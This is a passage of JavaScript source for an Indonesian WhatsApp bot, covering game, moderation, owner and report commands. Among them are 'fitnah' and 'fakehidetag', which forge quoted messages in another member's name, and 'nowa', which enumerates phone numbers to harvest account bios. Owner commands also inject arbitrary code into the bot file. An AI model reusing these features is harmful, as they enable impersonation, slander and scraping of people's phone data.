var mybal = db.data.users[users].saldo
var boal = pangkat(users).rank
const _pre = require("./lib/premium");
let premiu = JSON.parse(fs.readFileSync('./database/premium.json'));
const isCreato = [botNumber, ...ownerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(users)
const isPremi = _pre.checkPremiumUser(users, premiu)
const gcountop = isPremi ? gcounti.prem : gcounti.user
var limitPrib = `${db.data.users[users].limit}`
let nonya = await PhoneNumber('+' + users.replace('@s.whatsapp.net', '')).getNumber('international')
var teke = `\n*👤 Nama :* ${db.data.users[users].nama}\n*🔢 Nomor :* ${nonya}\n*📦 Status :* ${isCreato ? "🤴 Developer" : isPremi ? '👑 VIP User 👑' : "Free User"}\n*💳 Limit :* ${isPremi ? 'Unlimited' : limitPrib}\n*🕹️ Limit Game :* ${db.data.users[users].glimit}\n*🏦 Saldo :* Rp ${mybal}\n*🛡️ Rank :* ${boal} (${db.data.users[users].rank} points)\n*⚔️ Level :* ${db.data.users[users].level} (${db.data.users[users].exp}/2500)\n\n`
try {
avatar = await vreden.profilePictureUrl(users, "image")
} catch {
avatar = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
const phon = PhoneNumber('+' + users.replace('@s.whatsapp.net', '')).getNumber('international')
const rank = await new canvafy.Rank()
.setAvatar(avatar)
.setBackground("image", "https://telegra.ph/file/d0fce5c840f366526bab7.jpg")
.setUsername(phon)
.setBorder("#ff0000")
.setBarColor("#ff0000")
.setCustomStatus("#ff0000")
.setLevel(db.data.users[users].level)
.setRank(pangkat(users).id, pangkat(users).name)
.setCurrentXp(db.data.users[users].exp)
.setRequiredXp(2500)
.build();
let button = [
              {
                "name": "single_select",
                "buttonParamsJson": "{\n  title: 'Claim Points',\n  sections: [\n    {\n      title: 'Weekly And Monthly',\n      rows: [\n  {\n    header: 'Claim Weekly Reward 🟣',\n    title: 'mingguan',\n    id: '.mingguan'\n  },\n  {\n    header: 'Claim Monthly Reward 🟡',\n    title: 'bulanan',\n    id: '.bulanan'\n  }\n]\n    },{\n      title: 'Game Get Reward',\n      rows: [\n  {\n    header: 'Asah Otak 🧠',\n    title: 'asahotak',\n    id: '.asahotak'\n  },{\n    header: 'Tebak Cak Lontong 🎴',\n    title: 'caklontong',\n    id: '.caklontong'\n  },{\n    header: 'Family 100 Game 💯',\n    title: 'family100',\n    id: '.family100'\n  },{\n    header: 'Lengkapi Kalimat 🕵️‍♂️',\n    title: 'lengkapikalimat',\n    id: '.lengkapikalimat'\n  },{\n    header: 'Slot Game 🎰',\n    title: 'slot',\n    id: '.slot'\n  },{\n    header: 'Susun Kata 🗯️',\n    title: 'susunkata',\n    id: '.susunkata'\n  },{\n    header: 'Tebak Aplikasi 📱',\n    title: 'tebakaplikasi',\n    id: '.tebakaplikasi'\n  },{\n    header: 'Tebak Bendera 🇮🇩',\n    title: 'tebakbendera',\n    id: '.tebakbendera'\n  },{\n    header: 'Tebak Bom 💣',\n    title: 'tebakbom',\n    id: '.tebakbom'\n  },{\n    header: 'Tebak Free Fire 🔫',\n    title: 'tebakff',\n    id: '.tebakff'\n  },{\n    header: 'Tebak Gambar 🖼️',\n    title: 'tebakgambar',\n    id: '.tebakgambar'\n  },{\n    header: 'Tebak Game 🎮',\n    title: 'tebakgame',\n    id: '.tebakgame'\n  },{\n    header: 'Tebak Mobile Legends 🕹️',\n    title: 'tebakhero',\n    id: '.tebakhero'\n  },{\n    header: 'Tebak Kalimat ✉️',\n    title: 'tebakkalimat',\n    id: '.tebakkalimat'\n  },{\n    header: 'Tebak Kata 📠',\n    title: 'tebakkata',\n    id: '.tebakkata'\n  },{\n    header: 'Tebak Kimia ☣️',\n    title: 'tebakkimia',\n    id: '.tebakkimia'\n  },{\n    header: 'Tebak Lirik 🎶',\n    title: 'tebaklirik',\n    id: '.tebaklirik'\n  },{\n    header: 'Tebak Siapa 👤',\n    title: 'tebaksiapa',\n    id: '.tebaksiapa'\n  },{\n    header: 'Tebak Tebakan ❓',\n    title: 'tebaktebakan',\n    id: '.tebaktebakan'\n  }\n]\n    }\n  ]\n}"
              }
             ]
sendButtonImage(m.chat, "------------ » *ACCOUNT* « ------------", teke, rank, button)
db.data.users[m.sender].exp += await randomNomor(20)
}
break
// Baileys
case 'fitnah':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!text) return vreden.sendTextWithMentions(m.chat, `Gunakan dengan cara ${prefix+command} *@tag|pesantarget|pesanbot*\n\n_Contoh_\n\n${prefix+command} @${m.sender.split("@")[0]}|enak ga semalem|enak banget`, m)
var org = text.split("|")[0]
var target = text.split("|")[1];
var bot = text.split("|")[2];
if (!org.startsWith('@')) return warning('Tag orangnya')
if (!target) return warning(`Masukkan pesan target!`)
if (!bot) return warning(`Masukkan pesan bot!`)
var mens = parseMention(target)
addCountCmd('fitnah', m.sender, _cmd)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { extemdedTextMessage: { text: `${target}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { conversation: `${target}` }}
vreden.sendMessage(m.chat, { text: bot, mentions: mens }, { quoted: mens.length > 2 ? msg1 : msg2 })
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'nowa':
if (!isPremium) return tolakk(mess.OnlyPrem)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *nomor*\n\n_Contoh_\n\n${prefix+command} 628XXXXXXXXXX`)
if (text.includes('x')) return warning('Misal 6285xxx')
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
addCountCmd('nowa', m.sender, _cmd)
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = teks.split('x')[0]
var nomer1 = teks.split('x')[countInstances(teks, 'x')] ? teks.split('x')[countInstances(teks, 'x')] : ''
var random_length = countInstances(teks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}

var nomerny = `List Nomer\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`

for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]

var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}

var anu = await vreden.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false

try {
try {
var anu1 = await vreden.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
} else {
if (random_length == 6) {
var thn = `${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}`
if (thn.endsWith('2009')) {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBio Name : ${anu1.status}\nTahun : ${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}\n\n`
console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
}
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBio Name : ${anu1.status}\nTahun : ${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}\n\n`
console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
}
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [NOT REGISTERED]`, 'red'))
}
}
m.reply(`${nomerny}${no_bio}${no_watsap}`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'q': case 'quoted': {
if (!m.quoted) return warning('Reply Pesannya!!')
let gwm = await vreden.serializeM(await m.getQuotedObj())
if (!gwm.quoted) return warning('Pesan Yang anda reply tidak mengandung reply')
await gwm.quoted.copyNForward(m.chat, true)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'fakehidetag':
if (!isPremium) return warning(mess.OnlyPrem)
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!text) return vreden.sendTextWithMentions(m.chat, `Gunakan dengan cara ${prefix + command} *@tag|text*\n\n_Contoh_\n\n${prefix + command} @${m.sender.split("@")[0]}|Halo`, m)
var org = text.split("|")[0]
var teks = text.split("|")[1];
if (!org.startsWith('@')) return warning('Tag orangnya')
var mem2 = []
groupMembers.map( i => mem2.push(i.id) )
var mens = parseMention(target)
addCountCmd('fakehidetag', m.sender, _cmd)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { extemdedTextMessage: { text: `${prefix}hidetag ${teks}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { conversation: `${prefix}hidetag ${teks}` }}
vreden.sendMessage(m.chat, { text: teks ? teks : '', mentions: mem2 }, { quoted: mens.length > 2 ? msg1 : msg2 })
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'react':
if (!isPremium) return rely(mess.OnlyPrem)
if (!m.quoted) return warning(`Balas pesannya`)
if (!text) return warning(`Masukkan 1 emoji`)
if (!isEmoji(text)) return warning(`Itu bukan emoji!`)
if (isEmoji(text).length > 1) return warning(`Satu aja emojinya`)
addCountCmd('react', m.sender, _cmd)
await vreden.sendMessage(m.chat, { react: { text: text, key: quoted.key }})   
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'setcmd': case 'addcmd':{
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!m.quoted) return warning( 'Reply Pesan!')
if (!m.quoted.fileSha256) return warning ('SHA256 Hash Missing')
if (!text) return warning(`*Masukan Input Query!*\n\nContoh ${prefix + command} .menu`)
let hash = m.quoted.fileSha256.toString('base64')
if (db.data.sticker[hash] && db.data.sticker[hash].locked) return warning( 'You have no permission to change this sticker command')
db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
m.reply(`Done!`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delcmd': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) return warning ('SHA256 Hash Missing')
if (db.data.sticker[hash] && db.data.sticker[hash].locked) return warning( 'You have no permission to change this sticker command')
delete db.data.sticker[hash]
m.reply(`Done!`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
// Owners Menu
case 'clearallgc': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
for (let i of anulistg) {
let metadata = await vreden.groupMetadata(i)
await vreden.chatModify({delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]}, metadata.id)
}
m.reply('Menghapus Semua Pesan Grup...')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'clearallpc': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let anulistg = await store.chats.all().filter(v => v.id.endsWith('@s.whatsapp.net')).map(v => v.id)
for (let i of anulistg) {
await vreden.chatModify({delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]}, i)
}
m.reply('Menghapus Semua Pesan Chat...')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'listgc': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `*Group Chat*
Total: ${anulistg.length} Group\n\n`
for (let i of anulistg) {
let metadata = await vreden.groupMetadata(i)
teks += `*Name :* ${metadata.subject}
*Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}
*ID :* ${metadata.id}
*Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}
*Member :* ${metadata.participants.length}\n\n──────────────\n\n`
}
vreden.sendTextWithMentions(m.chat, teks, m)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'listpc': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let anulistg = await store.chats.all().filter(v => v.id.endsWith('@s.whatsapp.net')).map(v => v.id)
let teks = `*Personal Chat*
Total: ${anulistg.length} Chat\n\n`
for (let i of anulistg) {
teks += `*User :* @${i.split('@')[0]}\n*Chat :* https://wa.me/${i.split('@')[0]}\n\n──────────────\n\n`
}
vreden.sendTextWithMentions(m.chat, teks, m)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'joingc': case 'join': {
if (!isCreator) return warning(`Mau sewa bot buat jaga gc? silahkan hubungi owner`)
if (!text) return warning(`Kirim perintah ${prefix + command} _linkgrup_`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return warning(mess.error.Iv)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let result = args[0].split('https://chat.whatsapp.com/')[1]
await vreden.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'getinfogc': case 'getgc': {
if (!text) return warning(`Kirim perintah ${prefix + command} _linkgrup_`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return warning(mess.error.Iv)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let result = args[0].split('https://chat.whatsapp.com/')[1]
let inpo = await vreden.groupGetInviteInfo(result)
let teks = `*乂 GRUP LINK INFO*

*ID:* ${inpo.id}
*Name:* ${inpo.subject}
*Owner:* ${inpo.owner}
*Kirim Pesan:* ${inpo.announce ? 'Hanya Admin' : "Semua Orang"}
*Persetujuan Admin:* ${inpo.joinApprovalMode ? 'Yes' : "No"}
*Member Add Mode:* ${inpo.memberAddMode ? 'Yes' : "No"}
*Desk:* ${inpo.desc}
*Anggota Teratas:*
`
for (let x of inpo.participants) {
teks += `
- @${x.id.split('@')[0]}`
}
mbales(teks)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'leavegc': {
if (!isCreator) return tolakk(mess.OnlyOwner)
await vreden.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'public': {
if (!isCreator) return tolakk(mess.OnlyOwner)
vreden.public = true
m.reply('Sukses Change To Public Mode')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bl': case 'blacklist': case 'tandai': {
if (!isCreator && !isAdmins) return tolakk(mess.GrupAdmin)
try {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (ownerNumber.includes(users)) return warning('Tidak Dapat Melakukannya Kepada Owner')
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
const isBlacklistt = blacklist.includes(users) ? true : false
if (isBlacklistt) return vreden.sendTextWithMentions(m.chat, `@${users.split('@')[0]} Telah Di Blacklist Sebelumnya`, m)
blacklist.push(users)
fs.writeFileSync('./database/blacklist.json', JSON.stringify(blacklist, null, 2))
vreden.sendTextWithMentions(m.chat, `Succes blacklist @${users.split('@')[0]}`, m)
} catch (err) {
m.reply(`Tag/Reply Target Yang Mau Di blacklist`)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'unblack': case 'unblacklist': {
if (!isCreator && !isAdmins) return tolakk(mess.GrupAdmin)
try {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (ownerNumber.includes(users)) return warning('Tidak Dapat Melakukannya Kepada Owner')
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
const isBlacklistt = blacklist.includes(users) ? true : false
if (!isBlacklistt) return vreden.sendTextWithMentions(m.chat, `@${users.split('@')[0]} Tidak Ada Didaftar Blacklist`, m)
let anu = blacklist.indexOf(users)
blacklist.splice(anu, 1)
fs.writeFileSync('./database/blacklist.json', JSON.stringify(blacklist, null, 2))
vreden.sendTextWithMentions(m.chat, `Succes Unblacklist @${users.split('@')[0]}`, m)
} catch (err) {
m.reply(`Tag/Reply Target Yang Mau Di Un-blacklist`)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'listbl': case 'listblacklist': {
let txt = `------------ » *BLACKLIST* « ------------\nTotal: *${blacklist.length}* Ditandai\n\n`
for (let blck of blacklist) {
txt += `*»* @${blck.split('@')[0]}\n`
}
vreden.sendTextWithMentions(m.chat, txt, m)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'listban': case 'listbanned': {
let txt = `------------ » *BANNED* « ------------\nTotal: *${banned.length}* Di-banned\n\n`
for (let blk of banned) {
txt += `*»:* @${blk.split('@')[0]}\n`
}
vreden.sendTextWithMentions(m.chat, txt, m)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ban': case 'banned': {
if (!isCreator) return tolakk(mess.OnlyOwner)
try {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (ownerNumber.includes(users)) return warning('Tidak Dapat Melakukannya Kepada Owner')
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
const iscBan = banned.includes(users)
if (iscBan) return vreden.sendTextWithMentions(m.chat, `@${users.split('@')[0]} Telah Di Banned Sebelumnya`, m)
banned.push(users)
fs.writeFileSync('./database/banned.json', JSON.stringify(banned, null, 2))
vreden.sendTextWithMentions(m.chat, `Succes banned @${users.split('@')[0]}`, m)
} catch (err) {
m.reply(`Tag/Reply Target Yang Mau Di Banned`)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'gfl': case 'gantifile':{
if (!isCreator) return tolakk('Fitur Khusus Owner!')
if (!text.includes("./")) return warning(`*• Example* : ${prefix + command} ./package.json`)
let files = fs.readdirSync(text.split(m.quoted.fileName)[0])
if (!files.includes(m.quoted.fileName)) return reply("File not found") 
let media = await downloadContentFromMessage(m.quoted, "document")
let buffer = Buffer.from([])
for await(const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(text, buffer)
m.reply(`Mengupload...`)
await sleep(2000)
m.reply(`Berhasil mengganti file ${q}`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'addfun': case 'addfunction': {
if (!isCreator) return tolakk('Fitur Khusus Owner!')
if (!text) return warning('Mana function nya bang?');
const fs = require('fs');
const namaFile = 'vreden.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return;
}
const posisiAwalGimage = data.indexOf("function randomNomor(min, max = null) {");
if (posisiAwalGimage !== -1) {
const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
if (err) {
m.reply('Terjadi kesalahan saat menulis file:', err);
} else {
m.reply('Berhasil menambahkan function baru!.');
}
});
} else {
m.reply('Tidak dapat menambahkan function dalam file.');
}
});
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case "getsw": {
          if (m.quoted.chat != "status@broadcast") return reply(`Reply Status WhatsApp !`);
          let buffer = await m.quoted.download();
          await vreden.sendFile(
            m.chat,
            buffer,
            "",
            m.quoted.text || "",
            null,
            false,
            { quoted: m },
          ).catch((_) => m.reply(m.quoted.text || ""));
        }
        break;
      case "listsw": {
          if (!isCreator) return m.reply("Pribasi woiii")
          if (!store.messages["status@broadcast"].array.length === 0) return m.reply("Gaada 1 status pun");
          let stories = store.messages["status@broadcast"].array;
          let story = stories.filter(
            (v) => v.message && v.message.protocolMessage?.type !== 0,
          );
          if (story.length === 0) return m.reply("Status gaada");
          const result = {};
          story.forEach((obj) => {
            let participant = obj.key.participant || obj.participant;
            participant = jidNormalizedUser(
              participant === "status_me" ? vreden.user.id : participant,
            );
            if (!result[participant]) {
              result[participant] = [];
            }
            result[participant].push(obj);
          });
          let type = (mType) =>
            getContentType(mType) === "extendedTextMessage"
              ? "text"
              : getContentType(mType).replace("Message", "");
          let text = "";
          for (let id of Object.keys(result)) {
            if (!id) return;
            text += `*- ${await vreden.getName(id)}*\n`;
            text += `${result[id].map((v, i) => `${i + 1}. ${type(v.message)}`).join("\n")}\n\n`;
          }
          await mbales(text.trim());
        }
        break;
case 'listcase': {
const code = fs.readFileSync("./vreden.js", "utf8")
var regex = /case\s+'([^']+)':/g;
var matches = [];
var match;
while ((match = regex.exec(code))) {
matches.push(match[1]);
}
let teks = `*Total Case*: ${matches.length} \n\n` 
matches.forEach(function (x) {
   teks += "  ◦  " + x + "\n"
})
m.reply(teks)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delcase': {
if (!isCreator) return tolakk('Fitur Khusus Owner!')
if (!text) return warning('Mana case nya bang?');
dellCase('./vreden.js', q)
m.reply('Berhasil menghapus case!.');
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'addcase': {
if (!isCreator) return tolakk('Fitur Khusus Owner!')
if (!text) return warning('Mana case nya bang?');
const fs = require('fs');
const namaFile = 'vreden.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return;
}
const posisiAwalGimage = data.indexOf("case 'addcase':");
if (posisiAwalGimage !== -1) {
const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
if (err) {
m.reply('Terjadi kesalahan saat menulis file:', err);
} else {
m.reply('Berhasil menambahkan case baru!.');
}
});
} else {
m.reply('Tidak dapat menambahkan case dalam file.');
}
});
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'getcase':
if (!isCreator) return tolakk('Khusus Owner!') 
if (!text) return warning(`Mau ambil case apa? `)
const getCase = (cases) => {
return "case" + `'${cases}'` + fs.readFileSync("./vreden.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
}
m.reply(`${getCase(q)}`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'unban': case 'unbanned': {
if (!isCreator) return tolakk(mess.OnlyOwner)
try {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
const iscBan = banned.includes(users)
if (!iscBan) return vreden.sendTextWithMentions(m.chat, `@${users.split('@')[0]} Tidak Ada Didaftar Banned`, m)
let anu = banned.indexOf(users)
banned.splice(anu, 1)
fs.writeFileSync('./database/banned.json', JSON.stringify(banned, null, 2))
vreden.sendTextWithMentions(m.chat, `Succes Unbanned @${users.split('@')[0]}`, m)
} catch (err) {
m.reply(`Tag/Reply Target Yang Mau Di Un-Banned`)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'self': {
if (!isCreator) return tolakk(mess.OnlyOwner)
vreden.public = false
m.reply('Sukses Change To Self Mode')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'block': case 'blok':
if (!isCreator) return tolakk(mess.OnlyOwner) 
if (!text) return warning(`Masukkan nomor target!`)
let blok = q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
vreden.updateBlockStatus(blok, 'block')
m.reply(`Sukses block @${blok.split('@')[0]}`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'unblock': case 'unblok':
if (!isCreator) return tolakk(mess.OnlyOwner) 
if (!text) return warning(`Masukkan nomor target!`)
let unblok = q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
vreden.updateBlockStatus(unblok, 'unblock')
m.reply(`Sukses unblock @${unblok.split('@')[0]}`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'listblock': case 'listblok':
let listblok = await vreden.fetchBlocklist()
m.reply('*LIST BLOCK*\n' + `Total: ${listblok == undefined ? '*0* Diblokir' : '*' + listblok.length + '* Diblokir'}\n\n` + listblok.map(v => '» @' + v.replace(/@.+/, '')).join`\n`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'sampah':
if (!isCreator) return tolakk(mess.OnlyOwner)
let all = await fs.readdirSync('./sticker')
var teks = `JUMLAH SAMPAH SYSTEM\n\n`
teks += `Total : ${all.filter(v => v.endsWith("gif") || v.endsWith("png") || v.endsWith("mp3") || v.endsWith("mp4") || v.endsWith("jpg") || v.endsWith("jpeg") || v.endsWith("webp") || v.endsWith("webm") ).map(v=>v).length} Sampah\n\n`
teks += all.filter(v => v.endsWith("gif") || v.endsWith("png") || v.endsWith("mp3") || v.endsWith("mp4") || v.endsWith("jpg") || v.endsWith("jpeg") || v.endsWith("webp") || v.endsWith("webm") ).map(o=>`${o}\n`).join("");
m.reply(teks)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'sendpc': {
if (!q) return warning(`Contoh: ${prefix+command} 628572562726|halo`)
var no = text.split('|')[0]
var cet = text.split('|')[1]
if (isNaN(no)) return warning(`Nomor harus berupa angka!`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : no.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
try {
await vreden.sendText(`${users}`, `${cet}`, fconver)
} catch (e) {
m.reply('Terjadi Kesalahan')
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'report':{
this.report = this.report ? this.report : {}
roof = Object.values(this.report).find(reporrr => [reporrr.a, reporrr.b].includes(m.sender))
if (roof) return warning("Kamu Sedang Berkomunikasi Dengan Owner")
if (m.isGroup) return warning('Fitur Khusus Di private chat!')
if (!text) return warning(`Kirim Perintah ${prefix + command} pesan\n\nContoh :\n${prefix + command} bang ytmp3 error\n`)
var yoi = `\n\nDari: ${usernomor}\nPukul: ${jam}\n\n*Contents of the report*\n${text}`
let id = m.sender
this.report[id] = {
id,
a: m.sender,
b: numm,
state: 'WAITING'
}
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Tolak Report\",\"id\":\".tolakreport\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"Balas Report\",\"id\":\".balasreport\"}`
              }
           ]
sendButtonBiasa(numm, `*USER REPORTED*`, yoi, button)
vreden.sendTextWithMentions(m.chat, `📦 *REPORT - BOT*\n\n- *Name* : @${m.sender.split("@")[0]}\n- *Waktu* : ${jam}\n\n*REPORT* :\n${text}\n\n_Pesan Telah Dikirimkan_\n> ${footxt}`, m)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'balasreport': {
roof = Object.values(this.report).find(reporrr => [reporrr.a, reporrr.b].includes(m.sender))
if (!roof) return warning("Belum ada laporan")
find = Object.values(this.report).find(reporrr => reporrr.state == 'WAITING')
let room = Object.values(this.report).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find.b = m.sender
find.state = 'CHATTING'
this.report[find.id] = {...find}
await vreden.sendMessage(other, {text: `Report Kamu Telah Dikonfirmasi Team, Sekarang Kamu Bisa Chat Dengan Team Melalui Bot\n\n*NOTE :*\nJika ingin berhenti dari CS center, silahkan ketik .stopreport`, mentions: [m.sender]})
vreden.sendMessage(m.chat, {text: `_Berhasil Menerima Report!_\n\n*NOTE :*\nJika ingin berhenti dari CS center, silahkan ketik .stopreport`})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tolakreport': {
roof = Object.values(this.report).find(reporrr => [reporrr.a, reporrr.b].includes(m.sender))
if (!roof) return warning("Belum ada laporan")
let room = Object.values(this.report).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find = Object.values(this.report).find(reporrr => reporrr.state == 'WAITING')
vreden.sendMessage(other, {text: `_Uppsss... Team Kami Menolak Laporan Kamu_`, mentions: [m.sender]})
// await vreden.sendMessage(find.a, {text: `_Uppsss... @${find.b.split("@")[0]} Menolak menfess kamu_`,mentions: [find.b]})
m.reply("Report Ditolak ✅")
delete this.report[roof.id]
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'stopreport': {
 //find = Object.values(this.report).find(reporrr => reporrr.state == 'WAITING')
find = Object.values(this.report).find(reporrr => [reporrr.a, reporrr.b].includes(m.sender))
if (!find) return warning("Belum ada laporan")
const to = find.a == m.sender ? find.b : find.a
vreden.sendMessage(to, {text: `_Team Kami Mengakhiri Chat!_\n\n> Terimakasih~`, mentions:[m.sender]})
await m.reply("Chat Klien Di Putus!")
delete this.report[find.id]
}
 db.data.users[m.sender].exp += await randomNomor(20)
break
case 'request': {
